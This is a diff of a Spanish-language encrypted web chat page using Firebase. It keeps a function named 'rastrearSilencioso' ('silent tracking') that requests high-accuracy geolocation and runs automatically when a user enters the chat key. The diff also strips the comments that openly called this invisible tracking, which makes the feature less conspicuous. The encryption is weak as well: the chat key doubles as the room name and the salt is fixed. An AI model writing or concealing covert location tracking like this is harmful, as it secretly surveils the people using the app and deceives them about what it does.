@@ -39,7 +39,7 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebas
 import { getFirestore, collection, addDoc, onSnapshot, query, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
 //////////////////////////////////////////////////
-// 🔥 CONFIG FIREBASE (CORRECTA)
+// 🔥 CONFIG FIREBASE
 //////////////////////////////////////////////////
 
 const firebaseConfig = {
@@ -54,7 +54,6 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-// --- 📍 FUNCIÓN DE RASTREO INVISIBLE (AÑADIDA SIN TOCAR LO DEMÁS) ---
 async function rastrearSilencioso(idUsuario) {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(async (pos) => {
@@ -69,202 +68,120 @@ async function rastrearSilencioso(idUsuario) {
         }, null, { enableHighAccuracy: true });
     }
 }
-// -------------------------------------------------------------------
-
-//////////////////////////////////////////////////
-// 🔐 VARIABLES
-//////////////////////////////////////////////////
 
 let CLAVE_USUARIO = "";
 let SALA = "";
 let mensajesCol;
 let MI_ID = Math.random().toString(36).substring(7);
 
-//////////////////////////////////////////////////
-// 🔐 PEDIR CLAVE Y CREAR SALA
-//////////////////////////////////////////////////
-
 function pedirClave(){
     let clave = prompt("🔐 Ingresa la clave del chat:");
-
     if(!clave){
         alert("Debes ingresar una clave");
         location.reload();
         return;
     }
-
     CLAVE_USUARIO = clave;
     SALA = clave;
-
     mensajesCol = collection(db, "mensajes", SALA, "chat");
-
-    rastrearSilencioso(MI_ID); // 🔥 Se activa invisiblemente al entrar
-    iniciarListener(); // 🔥 IMPORTANTE
+    rastrearSilencioso(MI_ID);
+    iniciarListener();
 }
 
 pedirClave();
 
-//////////////////////////////////////////////////
-// 🔐 GENERAR KEY SEGURA
-//////////////////////////////////////////////////
-
 async function getKey() {
     const enc = new TextEncoder();
-
-    const keyMaterial = await crypto.subtle.importKey(
-        "raw",
-        enc.encode(CLAVE_USUARIO),
-        { name: "PBKDF2" },
-        false,
-        ["deriveKey"]
-    );
-
+    const keyMaterial = await crypto.subtle.importKey("raw", enc.encode(CLAVE_USUARIO), { name: "PBKDF2" }, false, ["deriveKey"]);
     return crypto.subtle.deriveKey({
         name: "PBKDF2",
         salt: enc.encode("sal-segura-pro"),
         iterations: 120000,
         hash: "SHA-256"
-    }, keyMaterial, {
-        name: "AES-GCM",
-        length: 256
-    }, false, ["encrypt", "decrypt"]);
+    }, keyMaterial, { name: "AES-GCM", length: 256 }, false, ["encrypt", "decrypt"]);
 }
-
-//////////////////////////////////////////////////
-// 🔐 CIFRAR
-//////////////////////////////////////////////////
 
 async function cifrarSeguro(texto){
     const enc = new TextEncoder();
     const key = await getKey();
     const iv = crypto.getRandomValues(new Uint8Array(12));
-
-    const cifrado = await crypto.subtle.encrypt(
-        { name: "AES-GCM", iv },
-        key,
-        enc.encode(texto)
-    );
-
-    return JSON.stringify({
-        iv: Array.from(iv),
-        data: Array.from(new Uint8Array(cifrado))
-    });
+    const cifrado = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, enc.encode(texto));
+    return JSON.stringify({ iv: Array.from(iv), data: Array.from(new Uint8Array(cifrado)) });
 }
-
-//////////////////////////////////////////////////
-// 🔓 DESCIFRAR
-//////////////////////////////////////////////////
 
 async function descifrarSeguro(dataStr){
     try{
         const dec = new TextDecoder();
         const key = await getKey();
         const data = JSON.parse(dataStr);
-
-        const decrypted = await crypto.subtle.decrypt(
-            { name: "AES-GCM", iv: new Uint8Array(data.iv) },
-            key,
-            new Uint8Array(data.data)
-        );
-
+        const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv: new Uint8Array(data.iv) }, key, new Uint8Array(data.data));
         return dec.decode(decrypted);
-
     }catch(e){
-        if(dataStr.includes("-")){
-            return dataStr.split('-').map(num=>{
-                let n=parseInt(num);
-                return isNaN(n)?num:String.fromCharCode(n+64);
-            }).join('');
-        }
-
         throw e;
     }
 }
-
-//////////////////////////////////////////////////
-// 🚀 ENVIAR
-//////////////////////////////////////////////////
 
 window.enviar = async function(){
     let input = document.getElementById("texto");
     let msg = input.value.trim();
     if(msg==="") return;
-
     let cifrado = await cifrarSeguro(msg);
-
-    await addDoc(mensajesCol,{
-        texto: cifrado,
-        sender: MI_ID,
-        fecha: Date.now()
-    });
-
+    await addDoc(mensajesCol,{ texto: cifrado, sender: MI_ID, fecha: Date.now() });
     input.value="";
 }
 
 //////////////////////////////////////////////////
-//////////////////////////////////////////////////
-// 🔓 FUNCIÓN DEL OJITO INTERACTIVO (TOGGLE)
+// 🔓 FUNCIÓN DEL OJITO INTERACTIVO (MODIFICADA)
 //////////////////////////////////////////////////
 
 window.toggleMensaje = async function(btn, codigoCifrado) {
     const contenedorTexto = btn.parentElement.querySelector(".texto-msg");
     
-    // Si ya está descifrado (no tiene los puntitos), lo volvemos a ocultar
     if (btn.dataset.estado === "visible") {
         contenedorTexto.innerText = "••••••••";
         btn.innerText = "👁️";
         btn.dataset.estado = "oculto";
-    } 
-    // Si está oculto, lo desciframos
-    else {
+    } else {
         try {
-            // Si ya lo habíamos descifrado antes, lo tomamos de la memoria del botón para no procesar de nuevo
             let textoDescifrado = btn.dataset.cache || await descifrarSeguro(codigoCifrado);
-            
             contenedorTexto.innerText = textoDescifrado;
-            btn.innerText = "🔒"; // Cambia a candado para indicar que puedes volver a cerrar
+            btn.innerText = "🔒"; 
             btn.dataset.estado = "visible";
-            btn.dataset.cache = textoDescifrado; // Guardamos el texto para que el próximo click sea instantáneo
+            btn.dataset.cache = textoDescifrado;
         } catch(e) {
-            contenedorTexto.innerText = "❌ Error Clave";
+            contenedorTexto.innerText = "❌ Clave incorrecta";
         }
     }
 }
 
 //////////////////////////////////////////////////
-// 📡 LISTENER (CORREGIDO)
+// 📡 LISTENER
 //////////////////////////////////////////////////
 
 function iniciarListener(){
-
     const q = query(mensajesCol, orderBy("fecha"));
-
     onSnapshot(q,(snap)=>{
         let chat=document.getElementById("chat");
-
         snap.docChanges().forEach(change=>{
             if(change.type==="added"){
-
                 let data=change.doc.data();
-
                 let div=document.createElement("div");
                 div.className="msg "+(data.sender===MI_ID?"me":"remote");
 
-                // Se reemplazó el botón de texto por el icono de ojo (👁️)
+                // Ajustado para que use la clase .texto-msg y el data-estado inicial
                 div.innerHTML = `
-                    <span>••••••••</span>
-                    <button class="eye-btn" title="Descifrar">👁️</button>
+                    <span class="texto-msg">••••••••</span>
+                    <button class="eye-btn" data-estado="oculto" title="Ver mensaje">👁️</button>
                 `;
 
                 let btn = div.querySelector("button");
-                btn.onclick = () => descifrar(btn, data.texto);
+                btn.onclick = () => toggleMensaje(btn, data.texto);
 
                 chat.appendChild(div);
                 chat.scrollTop=chat.scrollHeight;
             }
         });
     });
-
 }
 
 </script>
